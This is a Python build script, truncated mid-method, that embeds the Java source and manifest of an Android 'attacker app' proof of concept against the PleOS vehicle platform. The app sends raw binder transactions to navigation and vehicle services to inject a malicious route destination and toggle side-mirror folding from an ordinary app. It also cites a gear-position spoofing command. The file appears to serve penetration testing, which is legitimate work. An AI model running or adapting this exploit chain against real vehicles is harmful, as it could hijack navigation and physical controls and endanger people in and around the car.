#!/usr/bin/env python3
"""Build a tiny Android runtime PoC harness without Gradle.

The generated APK is local-only and is used to validate provider/activity
reachability on the PleOS emulator. It logs only sanitized metadata: counts,
booleans, hashes, and exception classes.
"""

from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys
import textwrap
import zipfile
from pathlib import Path


PACKAGE = "org.codex.pleos.poc"
ACTIVITY = "org.codex.pleos.poc.PocActivity"
WORKDIR = Path("data/runtime_poc_harness")
MARKER = "codex_probe_20260515"


MANIFEST = """\
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="org.codex.pleos.poc">
    <uses-sdk android:minSdkVersion="23" android:targetSdkVersion="34" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="ai.pleos.playground.service.vehicle.VEHICLE_BINDING" />
    <uses-permission android:name="pleos.car.permission.CAR_MIRRORS" />
    <uses-permission android:name="pleos.car.permission.CONTROL_CAR_MIRRORS" />
    <application android:label="CodexRuntimePoc" android:debuggable="true" android:allowBackup="false">
        <activity android:name=".PocActivity" android:exported="true" />
        <service android:name=".PocOverlayService" android:exported="true" />
    </application>
</manifest>
"""


JAVA_SOURCE = r"""
package org.codex.pleos.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.ServiceConnection;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.util.Base64;
import android.util.Log;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public final class PocActivity extends Activity implements ServiceConnection, Runnable, View.OnClickListener {
    private static final String TAG = "CodexPoc";
    private static final String ACTION_MAP_QUERY = "org.codex.pleos.poc.MAP_QUERY";
    private static final String ACTION_ACC4_START = "org.codex.pleos.poc.ACC4_START";
    private static final String ACTION_AM1_SUGGESTION = "org.codex.pleos.poc.AM1_SUGGESTION";
    private static final String ACTION_AM1_EVIDENCE_PROBE = "org.codex.pleos.poc.AM1_EVIDENCE_PROBE";
    private static final String ACTION_AM1_CLEANUP = "org.codex.pleos.poc.AM1_CLEANUP";
    private static final String ACTION_SHOWCASE = "org.codex.pleos.poc.SHOWCASE";
    private static final String ACTION_SHOWCASE_INSTALL = "org.codex.pleos.poc.SHOWCASE_INSTALL";
    private static final String ACTION_SHOWCASE_LMP1 = "org.codex.pleos.poc.SHOWCASE_LMP1";
    private static final String ACTION_SHOWCASE_MAP1 = "org.codex.pleos.poc.SHOWCASE_MAP1";
    private static final String ACTION_SHOWCASE_ACC4 = "org.codex.pleos.poc.SHOWCASE_ACC4";
    private static final String ACTION_SHOWCASE_AM1 = "org.codex.pleos.poc.SHOWCASE_AM1";
    private static final String ACTION_SHOWCASE_VC6 = "org.codex.pleos.poc.SHOWCASE_VC6";
    private static final String ACTION_SHOWCASE_STATIC = "org.codex.pleos.poc.SHOWCASE_STATIC";
    private static final String ACTION_SHOWCASE_SUMMARY = "org.codex.pleos.poc.SHOWCASE_SUMMARY";
    private static final String ACTION_IMPROVED_CARD = "org.codex.pleos.poc.IMPROVED_CARD";
    private static final String ACTION_IMPROVED_LMP1_IDENTITY = "org.codex.pleos.poc.IMPROVED_LMP1_IDENTITY";
    private static final String ACTION_IMPROVED_LMP1_RESULT = "org.codex.pleos.poc.IMPROVED_LMP1_RESULT";
    private static final String ACTION_IMPROVED_LMP1_ARTIFACT = "org.codex.pleos.poc.IMPROVED_LMP1_ARTIFACT";
    private static final String ACTION_IMPROVED_AM1_RESULT = "org.codex.pleos.poc.IMPROVED_AM1_RESULT";
    private static final String ACTION_LMP1_BOUNDARY_PROBE = "org.codex.pleos.poc.LMP1_BOUNDARY_PROBE";
    private static final String ACTION_NAVI_BINDER_PROBE = "org.codex.pleos.poc.NAVI_BINDER_PROBE";
    private static final String ACTION_VS1_VEHICLE_PROBE = "org.codex.pleos.poc.VS1_VEHICLE_PROBE";
    private static final String ACTION_CHAIN_UI = "org.codex.pleos.poc.CHAIN_UI";
    private static final String DEFAULT_ROUTE_DESTINATION = "HACKED_MALICIOUS_DEST";
    private static final String DEFAULT_ROUTE_POI_ID = "hacked-malicious-poi";
    private static final String DEFAULT_ROUTE_ADDRESS = "Demo malicious route marker";
    private static final String MARKER = "codex_probe_20260515";
    private View overlayView;
    private boolean naviProbeCompleted = false;
    private boolean naviServiceConnected = false;
    private boolean naviCallbackSeen = false;
    private String naviMarker = "";
    private String naviType = "";
    private String naviPayload = "";
    private String naviTxMode = "both";
    private String naviTxSummary = "";
    private boolean vehicleProbeActive = false;
    private boolean vehicleProbeCompleted = false;
    private boolean vehicleServiceConnected = false;
    private String vehicleDescriptor = "unknown";
    private String vehiclePropKey = "MIRROR_FOLD";
    private int vehicleAreaType = 5;
    private int vehicleAreaId = 0;
    private int vehicleValueType = 64;
    private String vehicleBeforeValue = "";
    private String vehicleAfterValue = "";
    private String vehicleRestoreValue = "";
    private String vehicleSetValue = "";
    private String vehicleSummary = "";
    private boolean chainUiActive = false;
    private TextView chainEvidenceView;
    private EditText chainDestinationEdit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        handleCurrentIntent();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleCurrentIntent();
    }

    @Override
    protected void onDestroy() {
        removeOverlayCard();
        super.onDestroy();
    }

    private void handleCurrentIntent() {
        String action = getIntent() == null ? null : getIntent().getAction();
        boolean shouldFinish = true;
        try {
            if (action == null || ACTION_CHAIN_UI.equals(action)) {
                shouldFinish = false;
                showChainUi();
            } else if (ACTION_SHOWCASE.equals(action)) {
                shouldFinish = false;
                runShowcase();
            } else if (ACTION_SHOWCASE_INSTALL.equals(action)) {
                shouldFinish = false;
                showInstallAssumption();
            } else if (ACTION_SHOWCASE_LMP1.equals(action)) {
                shouldFinish = false;
                showLmp1();
            } else if (ACTION_SHOWCASE_MAP1.equals(action)) {
                shouldFinish = false;
                showMap1();
            } else if (ACTION_SHOWCASE_ACC4.equals(action)) {
                shouldFinish = false;
                showAcc4();
            } else if (ACTION_SHOWCASE_AM1.equals(action)) {
                shouldFinish = false;
                showAm1();
            } else if (ACTION_SHOWCASE_VC6.equals(action)) {
                shouldFinish = false;
                showVc6();
            } else if (ACTION_SHOWCASE_STATIC.equals(action)) {
                shouldFinish = false;
                showStaticCreds();
            } else if (ACTION_SHOWCASE_SUMMARY.equals(action)) {
                shouldFinish = false;
                showSummary();
            } else if (ACTION_IMPROVED_CARD.equals(action)) {
                shouldFinish = false;
                showImprovedCard();
            } else if (ACTION_IMPROVED_LMP1_IDENTITY.equals(action)) {
                shouldFinish = false;
                showImprovedLmp1Identity();
            } else if (ACTION_IMPROVED_LMP1_RESULT.equals(action)) {
                shouldFinish = false;
                showImprovedLmp1Result();
            } else if (ACTION_IMPROVED_LMP1_ARTIFACT.equals(action)) {
                shouldFinish = false;
                showImprovedLmp1Artifact();
            } else if (ACTION_IMPROVED_AM1_RESULT.equals(action)) {
                shouldFinish = false;
                showImprovedAm1Result();
            } else if (ACTION_LMP1_BOUNDARY_PROBE.equals(action)) {
                runLmp1BoundaryProbe();
            } else if (ACTION_NAVI_BINDER_PROBE.equals(action)) {
                shouldFinish = false;
                runNaviBinderProbe();
            } else if (ACTION_VS1_VEHICLE_PROBE.equals(action)) {
                shouldFinish = false;
                runVs1VehicleProbe();
            } else if (ACTION_MAP_QUERY.equals(action)) {
                runMapQuery();
            } else if (ACTION_ACC4_START.equals(action)) {
                runAcc4Start();
            } else if (ACTION_AM1_SUGGESTION.equals(action)) {
                runAm1Suggestion();
            } else if (ACTION_AM1_EVIDENCE_PROBE.equals(action)) {
                runAm1EvidenceProbe();
            } else if (ACTION_AM1_CLEANUP.equals(action)) {
                runAm1Cleanup();
            } else {
                result("finding=unknown action_hash=" + sha256(action));
            }
        } catch (Throwable t) {
            result("finding=top exception_class=" + t.getClass().getName() + " message_hash=" + sha256(t.getMessage()));
        } finally {
            if (shouldFinish) {
                finish();
            }
        }
    }

    private void runNaviBinderProbe() {
        Intent launchIntent = getIntent();
        String requestedType = launchIntent == null ? null : launchIntent.getStringExtra("navi_type");
        if (requestedType == null || requestedType.length() == 0) {
            requestedType = "NotifyDrivingInfo";
        }
        String requestedTxMode = launchIntent == null ? null : launchIntent.getStringExtra("navi_tx");
        if (requestedTxMode == null || requestedTxMode.length() == 0) {
            requestedTxMode = "both";
        }
        String requestedPayload = launchIntent == null ? null : launchIntent.getStringExtra("navi_payload");
        if (requestedPayload == null || requestedPayload.length() == 0) {
            if ("NotifyCurrentRoadSpeedLimit".equals(requestedType)) {
                requestedPayload = "42";
            } else if ("NotifyCameraAlert".equals(requestedType) || "NotifyTBTInfo".equals(requestedType)) {
                requestedPayload = "[]";
            } else if ("RequestRoute".equals(requestedType)) {
                requestedPayload = "{\"longitude\":126.9389,\"latitude\":37.5665,\"poiName\":\""
                        + DEFAULT_ROUTE_DESTINATION + "\",\"poiId\":\"" + DEFAULT_ROUTE_POI_ID
                        + "\",\"address\":\"" + DEFAULT_ROUTE_ADDRESS
                        + "\",\"poiSubId\":\"hacked-malicious-sub\",\"routeOption\":\"RECOMMENDED\"}";
            } else if ("RequestRouteOverviewShow".equals(requestedType)) {
                requestedPayload = "{\"durationMs\":3000}";
            } else {
                requestedPayload = "{\"marker\":\"__MARKER__\",\"mode\":\"binder_smoke\"}";
            }
        }
        beginNaviBinderProbe(requestedType, requestedPayload, requestedTxMode);
    }

    private void beginNaviBinderProbe(String requestedType, String requestedPayload, String requestedTxMode) {
        naviProbeCompleted = false;
        naviServiceConnected = false;
        naviCallbackSeen = false;
        vehicleProbeActive = false;
        naviTxSummary = "";
        naviMarker = "CODEX_SAFE_NAVI_" + System.currentTimeMillis();
        naviType = requestedType;
        if (naviType == null || naviType.length() == 0) {
            naviType = "NotifyDrivingInfo";
        }
        naviTxMode = requestedTxMode;
        if (naviTxMode == null || naviTxMode.length() == 0) {
            naviTxMode = "both";
        }
        String payload = requestedPayload;
        if (payload == null || payload.length() == 0) {
            payload = "{\"marker\":\"__MARKER__\",\"mode\":\"binder_smoke\"}";
        }
        naviPayload = payload.replace("__MARKER__", naviMarker);
        Intent intent = new Intent("ai.pleos.playground.intent.action.NAVI_START");
        intent.setComponent(new ComponentName(
                "ai.pleos.playground.service.navi",
                "ai.pleos.playground.service.navi.NaviService"));

        try {
            boolean bindReturned = bindService(intent, this, BIND_AUTO_CREATE);
            Log.i(TAG, "NAVI_BINDER bind_return=" + bindReturned);
            if (!bindReturned) {
                completeNaviProbe(false,
                        "finding=navi-1 runtime_probe bind_return=false service_connected=false l1_bind_confirmed=false");
                return;
            }
        } catch (Throwable t) {
            completeNaviProbe(false,
                    "finding=navi-1 runtime_probe bind_return=false"
                            + " bind_exception_class=" + t.getClass().getName()
                            + " message_hash=" + sha256(t.getMessage())
                            + " l1_bind_confirmed=false");
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(this, 5000);
    }

    private void runVs1VehicleProbe() {
        vehicleProbeActive = true;
        vehicleProbeCompleted = false;
        vehicleServiceConnected = false;
        vehicleDescriptor = "unknown";
        vehicleSummary = "";
        vehicleBeforeValue = "";
        vehicleAfterValue = "";
        vehicleRestoreValue = "";
        vehicleSetValue = "";
        Intent launchIntent = getIntent();
        String requestedKey = launchIntent == null ? null : launchIntent.getStringExtra("vehicle_prop");
        if (requestedKey != null && requestedKey.length() > 0) {
            vehiclePropKey = requestedKey;
        } else {
            vehiclePropKey = "MIRROR_FOLD";
        }
        vehicleAreaType = getIntExtra("vehicle_area_type", 5);
        vehicleAreaId = getIntExtra("vehicle_area_id", 0);
        vehicleValueType = getIntExtra("vehicle_value_type", 64);
        Intent intent = new Intent("ai.pleos.playground.vehicle.VEHICLE_START");
        intent.setComponent(new ComponentName(
                "ai.pleos.playground.service.vehicle",
                "ai.pleos.playground.service.vehicle.VehicleService"));
        try {
            boolean bindReturned = bindService(intent, this, BIND_AUTO_CREATE);
            Log.i(TAG, "VS1_BINDER bind_return=" + bindReturned);
            if (!bindReturned) {
                completeVehicleProbe(false,
                        "finding=vs-1 runtime_probe bind_return=false service_connected=false v1_bind_confirmed=false");
                return;
            }
        } catch (Throwable t) {
            completeVehicleProbe(false,
                    "finding=vs-1 runtime_probe bind_return=false"
                            + " bind_exception_class=" + t.getClass().getName()
                            + " message_hash=" + sha256(t.getMessage())
                            + " v1_bind_confirmed=false");
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(new VehicleProbeTimeout(this), 9000);
    }

    private int getIntExtra(String key, int defaultValue) {
        try {
            Intent launchIntent = getIntent();
            return launchIntent == null ? defaultValue : launchIntent.getIntExtra(key, defaultValue);
        } catch (Throwable t) {
            return defaultValue;
        }
    }

    private void showChainUi() {
        chainUiActive = true;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(36, 30, 36, 30);
        root.setBackgroundColor(Color.rgb(248, 250, 252));

        TextView title = new TextView(this);
        title.setText("스마트 경로 도우미");
        title.setTextSize(28);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setTextColor(Color.rgb(15, 23, 42));
        title.setText("\uc2a4\ub9c8\ud2b8 \uacbd\ub85c \ub3c4\uc6b0\ubbf8");
        root.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Demo attacker app: 일반 앱 권한으로 내비 경로 UI와 VehicleService mirror property를 검증합니다.");
        subtitle.setTextSize(15);
        subtitle.setTextColor(Color.rgb(71, 85, 105));
        subtitle.setPadding(0, 8, 0, 18);
        subtitle.setText("Demo attacker app: \uc77c\ubc18 \uc571 \uad8c\ud55c\uc73c\ub85c \ub124\ube44 \uacbd\ub85c UI\uc640 VehicleService mirror property\ub97c \uac80\uc99d\ud569\ub2c8\ub2e4.");
        root.addView(subtitle);

        chainDestinationEdit = new EditText(this);
        chainDestinationEdit.setSingleLine(true);
        chainDestinationEdit.setText(DEFAULT_ROUTE_DESTINATION);
        chainDestinationEdit.setTextSize(18);
        chainDestinationEdit.setHint("목적지 marker");
        root.addView(chainDestinationEdit);
        chainDestinationEdit.setHint("\ubaa9\uc801\uc9c0 marker");

        root.addView(chainButton("악성 네비 경로 자동 설정", "nav"));
        root.addView(chainButton("사이드미러 상태 변경", "vehicle"));
        root.addView(chainButton("전체 시나리오 실행", "combined"));

        chainEvidenceView = new TextView(this);
        chainEvidenceView.setTextSize(14);
        chainEvidenceView.setTypeface(Typeface.MONOSPACE);
        chainEvidenceView.setTextColor(Color.rgb(15, 23, 42));
        chainEvidenceView.setPadding(0, 20, 0, 0);
        chainEvidenceView.setText("Evidence Log\n"
                + "- app: org.codex.pleos.poc\n"
                + "- root/system/platform signature: no\n"
                + "- vehicle binding permission: normal\n"
                + "- target vehicle property: MIRROR_FOLD only\n"
                + "- separate pentest evidence: ADB-root VHAL GEAR_POSITION spoofing\n");
        root.addView(chainEvidenceView);

        ScrollView scroll = new ScrollView(this);
        scroll.addView(root);
        setContentView(scroll);
    }

    private Button chainButton(String text, String tag) {
        Button button = new Button(this);
        if ("nav".equals(tag)) {
            text = "\uc545\uc131 \ub124\ube44 \uacbd\ub85c \uc790\ub3d9 \uc124\uc815";
        } else if ("vehicle".equals(tag)) {
            text = "\uc0ac\uc774\ub4dc\ubbf8\ub7ec \uc0c1\ud0dc \ubcc0\uacbd";
        } else if ("combined".equals(tag)) {
            text = "\uc804\uccb4 \uc2dc\ub098\ub9ac\uc624 \uc2e4\ud589";
        }
        button.setText(text);
        button.setTextSize(18);
        button.setTag(tag);
        button.setOnClickListener(this);
        return button;
    }

    @Override
    public void onClick(View view) {
        Object tag = view == null ? null : view.getTag();
        if ("nav".equals(tag)) {
            appendChainEvidence("\n[Navigation] RequestRoute trigger");
            beginNaviRouteFromUi();
        } else if ("vehicle".equals(tag)) {
            appendChainEvidence("\n[Vehicle] MIRROR_FOLD before/set/after trigger");
            appendPentestVehicleEvidenceNote();
            runVs1VehicleProbe();
        } else if ("combined".equals(tag)) {
            appendChainEvidence("\n[Combined] route UI injection -> pentest VHAL spoofing evidence -> mirror property write");
            appendPentestVehicleEvidenceNote();
            beginNaviRouteFromUi();
            new Handler(Looper.getMainLooper()).postDelayed(new ChainVehicleStep(this), 7000);
        }
    }

    void runVehicleFromChainStep() {
        appendChainEvidence("[Combined] running VehicleService step after navigation trigger");
        runVs1VehicleProbe();
    }

    private void appendChainEvidence(String line) {
        Log.i(TAG, "CHAIN_UI " + line.replace('\n', ' '));
        if (chainEvidenceView != null) {
            chainEvidenceView.append("\n" + line);
        }
    }

    private void beginNaviRouteFromUi() {
        String destination = chainDestinationEdit == null ? DEFAULT_ROUTE_DESTINATION : chainDestinationEdit.getText().toString();
        if (destination == null || destination.trim().length() == 0) {
            destination = DEFAULT_ROUTE_DESTINATION;
        }
        String safeDestination = safeToken(destination.trim());
        String payload = "{\"longitude\":126.9389,\"latitude\":37.5665,\"poiName\":\""
                + jsonEscape(safeDestination)
                + "\",\"poiId\":\"" + DEFAULT_ROUTE_POI_ID
                + "\",\"address\":\"" + DEFAULT_ROUTE_ADDRESS
                + "\",\"poiSubId\":\"hacked-malicious-sub\",\"routeOption\":\"RECOMMENDED\"}";
        appendChainEvidence("[Navigation] sending RequestRoute through NaviService Binder");
        new Handler(Looper.getMainLooper()).postDelayed(new ChainNaviRouteStep(this, payload), 900);
    }

    private void appendPentestVehicleEvidenceNote() {
        appendChainEvidence("[Pentest] Emulator VHAL GEAR_POSITION D evidence exists in attachment");
        appendChainEvidence("[Pentest] cmd car_service inject-vhal-event 0x21400400 0x0 8");
        appendChainEvidence("[Harness] this same-device app run executes MIRROR_FOLD only");
    }

    void runNaviRouteFromChainStep(String payload) {
        beginNaviBinderProbe("RequestRoute", payload, "request");
    }

    private static String jsonEscape(String value) {
        if (value == null) {
            return "";
        }
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    void onVehicleProbeTimeout() {
        if (!vehicleProbeCompleted) {
            completeVehicleProbe(true,
                    vehicleBaseResult()
                            + " timeout=true"
                            + " v1_bind_confirmed=" + vehicleServiceConnected
                            + " v2_set_transaction_accepted=false"
                            + " v3_state_changed=false");
        }
    }

    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        String component = name == null ? "" : name.flattenToShortString();
        if (vehicleProbeActive || component.contains("service.vehicle")) {
            handleVehicleServiceConnected(name, service);
            return;
        }
        naviServiceConnected = true;
        String descriptor = "unknown";
        try {
            descriptor = service == null ? "null" : service.getInterfaceDescriptor();
        } catch (Throwable t) {
            descriptor = "descriptor_exception_" + t.getClass().getName();
        }
        String tx1 = registerNaviCallback(service, new NaviCallbackBinder(this, naviMarker), getPackageName());
        String tx3 = shouldRunNaviTx(3) ? transactNavi(service, 3, getPackageName(), naviType, naviPayload)
                : "tx3_skipped=true";
        String tx4 = shouldRunNaviTx(4) ? transactNavi(service, 4, getPackageName(), naviType, naviPayload)
                : "tx4_skipped=true";
        naviTxSummary = "component=" + safeToken(name == null ? null : name.flattenToShortString())
                + " descriptor=" + safeToken(descriptor)
                + " application_id=" + getPackageName()
                + " type=" + naviType
                + " tx_mode=" + safeToken(naviTxMode)
                + " marker_hash=" + sha256(naviMarker)
                + " " + tx1
                + " " + tx3
                + " " + tx4;
        Log.i(TAG, "NAVI_BINDER interim " + naviTxSummary);
    }

    private void handleVehicleServiceConnected(final ComponentName name, final IBinder service) {
        vehicleServiceConnected = true;
        try {
            vehicleDescriptor = service == null ? "null" : service.getInterfaceDescriptor();
        } catch (Throwable t) {
            vehicleDescriptor = "descriptor_exception_" + t.getClass().getName();
        }
        new Thread(new VehicleSequenceRunner(this, name, service), "codex-vs1-probe").start();
    }

    void runVehicleSequenceFromThread(ComponentName name, IBinder service) {
        runVehicleSequence(name, service);
    }

    private void runVehicleSequence(ComponentName name, IBinder service) {
        String component = name == null ? "unknown" : name.flattenToShortString();
        VehicleCallbackResult before = getVehicleProperty(service, "before");
        if (!before.success) {
            vehicleSummary = vehicleBaseResult()
                    + " component=" + safeToken(component)
                    + " get_before_success=false"
                    + " get_before_error_hash=" + sha256(before.error)
                    + " v1_bind_confirmed=true"
                    + " v2_set_transaction_accepted=false"
                    + " v3_state_changed=false";
            Log.i(TAG, "VS1_BINDER interim " + vehicleSummary);
            completeVehicleProbe(true, vehicleSummary);
            return;
        }

        vehicleBeforeValue = before.value;
        Boolean beforeBool = parseBooleanLike(before.value);
        if (beforeBool == null) {
            vehicleSummary = vehicleBaseResult()
                    + " component=" + safeToken(component)
                    + " get_before_success=true"
                    + " before_value_hash=" + sha256(before.value)
                    + " before_value_preview=" + previewToken(before.value)
                    + " before_boolean_parse=false"
                    + " v1_bind_confirmed=true"
                    + " v2_set_transaction_accepted=false"
                    + " v3_state_changed=false";
            Log.i(TAG, "VS1_BINDER interim " + vehicleSummary);
            completeVehicleProbe(true, vehicleSummary);
            return;
        }

        vehicleRestoreValue = Boolean.toString(beforeBool.booleanValue());
        vehicleSetValue = Boolean.toString(!beforeBool.booleanValue());
        VehicleCallbackResult set = setVehicleProperty(service, 5, vehicleSetValue);
        String setPath = "tx5";
        if (!set.success) {
            VehicleCallbackResult fallback = setVehicleProperty(service, 7, vehicleSetValue);
            if (fallback.success) {
                set = fallback;
                setPath = "tx7";
            }
        }
        sleepQuietly(700);
        VehicleCallbackResult after = getVehicleProperty(service, "after");
        vehicleAfterValue = after.value;
        Boolean afterBool = parseBooleanLike(after.value);
        boolean changed = set.success && after.success && afterBool != null && afterBool.booleanValue() != beforeBool.booleanValue();

        VehicleCallbackResult restore = null;
        VehicleCallbackResult finalGet = null;
        if (set.success) {
            restore = setVehicleProperty(service, 5, vehicleRestoreValue);
            if (!restore.success) {
                VehicleCallbackResult fallbackRestore = setVehicleProperty(service, 7, vehicleRestoreValue);
                if (fallbackRestore.success) {
                    restore = fallbackRestore;
                }
            }
            sleepQuietly(700);
            finalGet = getVehicleProperty(service, "final");
        }
        Boolean finalBool = finalGet == null ? null : parseBooleanLike(finalGet.value);
        boolean restored = finalBool != null && finalBool.booleanValue() == beforeBool.booleanValue();

        vehicleSummary = vehicleBaseResult()
                + " component=" + safeToken(component)
                + " get_before_success=true"
                + " before_bool=" + beforeBool
                + " before_value_hash=" + sha256(before.value)
                + " set_path=" + setPath
                + " set_value=" + vehicleSetValue
                + " set_success=" + set.success
                + " set_error_hash=" + sha256(set.error)
                + " get_after_success=" + after.success
                + " after_bool=" + afterBool
                + " after_value_hash=" + sha256(after.value)
                + " restore_attempted=" + (restore != null)
                + " restore_success=" + (restore != null && restore.success)
                + " final_get_success=" + (finalGet != null && finalGet.success)
                + " final_bool=" + finalBool
                + " restored=" + restored
                + " v1_bind_confirmed=true"
                + " v2_set_transaction_accepted=" + set.success
                + " v3_state_changed=" + changed;
        Log.i(TAG, "VS1_BINDER interim " + vehicleSummary);
        completeVehicleProbe(true, vehicleSummary);
    }

    private String vehicleBaseResult() {
        return "finding=vs-1 runtime_probe"
                + " bind_return=true"
                + " service_connected=" + vehicleServiceConnected
                + " descriptor=" + safeToken(vehicleDescriptor)
                + " application_id=" + getPackageName()
                + " prop_key=" + safeToken(vehiclePropKey)
                + " area_type=" + vehicleAreaType
                + " area_id=" + vehicleAreaId
                + " value_type=" + vehicleValueType
                + " permission_model=normal";
    }

    private VehicleCallbackResult getVehicleProperty(IBinder binder, String label) {
        VehicleCallbackResult callback = new VehicleCallbackResult(label);
        Parcel data = Parcel.obtain();
        try {
            data.writeInterfaceToken("ai.pleos.playground.vehicle.IVehicleService");
            data.writeString(vehiclePropKey);
            data.writeInt(vehicleAreaType);
            data.writeInt(vehicleAreaId);
            data.writeStrongBinder(new VehicleGetCallbackBinder(callback));
            boolean ok = binder != null && binder.transact(4, data, null, IBinder.FLAG_ONEWAY);
            callback.transactReturn = ok;
        } catch (Throwable t) {
            callback.error = t.getClass().getName() + ":" + t.getMessage();
            callback.done = true;
        } finally {
            data.recycle();
        }
        callback.await(3000);
        Log.i(TAG, "VS1_GET label=" + label + " transact_return=" + callback.transactReturn
                + " success=" + callback.success + " value_hash=" + sha256(callback.value)
                + " error_hash=" + sha256(callback.error));
        return callback;
    }

    private VehicleCallbackResult setVehicleProperty(IBinder binder, int code, String value) {
        VehicleCallbackResult callback = new VehicleCallbackResult("set_tx" + code);
        Parcel data = Parcel.obtain();
        try {
            data.writeInterfaceToken("ai.pleos.playground.vehicle.IVehicleService");
            data.writeString(vehiclePropKey);
            data.writeInt(vehicleAreaType);
            data.writeInt(vehicleAreaId);
            data.writeInt(vehicleValueType);
            data.writeString(value);
            data.writeStrongBinder(new VehicleSetCallbackBinder(callback));
            boolean ok = binder != null && binder.transact(code, data, null, IBinder.FLAG_ONEWAY);
            callback.transactReturn = ok;
        } catch (Throwable t) {
            callback.error = t.getClass().getName() + ":" + t.getMessage();
            callback.done = true;
        } finally {
            data.recycle();
        }
        callback.await(3000);
        Log.i(TAG, "VS1_SET tx=" + code + " transact_return=" + callback.transactReturn
                + " success=" + callback.success + " value=" + safeToken(value)
                + " error_hash=" + sha256(callback.error));
        return callback;
    }

    private Boolean parseBooleanLike(String value) {
        if (value == null) {
            return null;
        }
        String s = value.trim().toLowerCase();
        if (s.equals("true") || s.equals("\"true\"") || s.contains(":true") || s.contains("true,")) {
            return Boolean.TRUE;
        }
        if (s.equals("false") || s.equals("\"false\"") || s.contains(":false") || s.contains("false,")) {
            return Boolean.FALSE;
        }
        return null;
    }

    private void sleepQuietly(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException ignored) {
        }
    }

    private void completeVehicleProbe(boolean shouldUnbind, String summary) {
        if (vehicleProbeCompleted) {
            return;
        }
        vehicleProbeCompleted = true;
        if (shouldUnbind) {
            try {
                unbindService(this);
            } catch (Throwable ignored) {
            }
        }
        result(summary);
        if (chainUiActive) {
            appendChainEvidence("[Vehicle] " + summary);
            return;
        }
        finish();
    }

    private boolean shouldRunNaviTx(int code) {
        if ("both".equals(naviTxMode)) {
            return true;
        }
        if ("request".equals(naviTxMode) || "tx3".equals(naviTxMode)) {
            return code == 3;
        }
        if ("provider".equals(naviTxMode) || "tx4".equals(naviTxMode)) {
            return code == 4;
        }
        return true;
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {
        if (vehicleProbeActive) {
            Log.i(TAG, "VS1_BINDER disconnected component=" + safeToken(name == null ? null : name.flattenToShortString()));
            return;
        }
        Log.i(TAG, "NAVI_BINDER disconnected component=" + safeToken(name == null ? null : name.flattenToShortString()));
    }

    @Override
    public void run() {
        completeNaviProbe(true,
                "finding=navi-1 runtime_probe"
                        + " bind_return=true"
                        + " service_connected=" + naviServiceConnected
                        + " " + naviTxSummary
                        + " callback_seen=" + naviCallbackSeen
                        + " timeout_ms=5000"
                        + " l1_bind_confirmed=" + naviServiceConnected
                        + " l2_callback_bus_confirmed=" + naviCallbackSeen
                        + " l2_request_event_candidate=true");
    }

    void onNaviCallbackReceived(String type, String data, boolean markerSeen) {
        naviCallbackSeen = true;
        Log.i(TAG, "NAVI_CALLBACK finding=navi-1 callback_received=true type="
                + safeToken(type) + " data_hash=" + sha256(data) + " marker_seen=" + markerSeen);
    }

    private String registerNaviCallback(IBinder binder, IBinder callback, String applicationId) {
        if (binder == null) {
            return "tx1_register_return=false tx1_register_exception_class=null_binder";
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken("ai.pleos.playground.navi.INaviService");
            data.writeStrongBinder(callback);
            data.writeString(applicationId);
            boolean ok = binder.transact(1, data, reply, 0);
            return "tx1_register_return=" + ok + " tx1_register_exception_class=none";
        } catch (Throwable t) {
            return "tx1_register_return=false tx1_register_exception_class="
                    + t.getClass().getName() + " tx1_register_message_hash=" + sha256(t.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private String transactNavi(IBinder binder, int code, String applicationId, String type, String payload) {
        if (binder == null) {
            return "tx" + code + "_return=false tx" + code + "_exception_class=null_binder";
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken("ai.pleos.playground.navi.INaviService");
            data.writeString(applicationId);
            data.writeString(type);
            data.writeString(payload);
            boolean ok = binder.transact(code, data, reply, 0);
            return "tx" + code + "_return=" + ok + " tx" + code + "_exception_class=none";
        } catch (Throwable t) {
            return "tx" + code + "_return=false tx" + code + "_exception_class="
                    + t.getClass().getName() + " tx" + code + "_message_hash=" + sha256(t.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void completeNaviProbe(boolean shouldUnbind, String summary) {
        if (naviProbeCompleted) {
            return;
        }
        naviProbeCompleted = true;
        if (shouldUnbind) {
            try {
                unbindService(this);
            } catch (Throwable ignored) {
            }
        }
        result(summary);
        if (chainUiActive) {
            appendChainEvidence("[Navigation] " + summary);
            return;
        }
        finish();
    }

    private void runShowcase() {
        TextView view = new TextView(this);
        view.setTextSize(18);
        view.setTypeface(Typeface.MONOSPACE);
        view.setGravity(Gravity.START);
        view.setPadding(28, 34, 28, 28);
        setContentView(view);

        StringBuilder out = new StringBuilder();
        out.append("PleOS Runtime PoC Evidence\n");
        out.append("2026-05-15 / emulator-only / redacted\n\n");
        out.append("[lmp-1] exported prompt provider\n");
        out.append(runPromptProviderSummary()).append("\n\n");
